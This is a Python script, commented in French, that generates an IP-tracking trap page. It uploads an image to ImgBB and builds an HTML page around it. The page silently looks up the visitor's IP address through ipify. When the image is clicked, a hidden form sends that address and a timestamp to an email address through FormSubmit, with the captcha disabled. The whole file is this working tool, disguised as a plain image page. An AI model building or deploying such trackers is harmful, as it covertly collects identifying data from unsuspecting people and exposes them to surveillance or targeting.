import os
import requests
from datetime import datetime

def upload_image_to_imgbb(image_path: str, api_key: str) -> str:
    with open(image_path, "rb") as file:
        url = "https://api.imgbb.com/1/upload"
        payload = {"key": api_key}
        files = {"image": file}
        response = requests.post(url, data=payload, files=files)

    if response.status_code == 200:
        return response.json()['data']['url']
    else:
        raise Exception(f"Erreur lors de l'upload : {response.text}")

def generate_image_tracker_html(email, image_path, output_path, imgbb_api_key):
    # Étape 1 : héberger l'image sur ImgBB
    image_url = upload_image_to_imgbb(image_path, imgbb_api_key)
    print("Image hébergée :", image_url)

    # Étape 2 : encoder l'email pour l'URL FormSubmit
    email_encoded = email.replace('@', '%40')

    # Étape 3 : générer le HTML
    html_content = f"""<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        img {{
            max-width: 100%;
            height: auto;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <form id="tracker" action="https://formsubmit.co/{email_encoded}" method="POST">
        <input type="hidden" name="Date" value="{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}">
        <input type="hidden" name="IP" id="ip_input">
        <input type="hidden" name="_captcha" value="false">
    </form>

    <img src="{image_url}" onclick="document.getElementById('tracker').submit();">

    <script>
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {{
                document.getElementById('ip_input').value = data.ip;
            }});
    </script>
</body>
</html>
"""
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(html_content)

    print(f"Fichier HTML généré : {output_path}")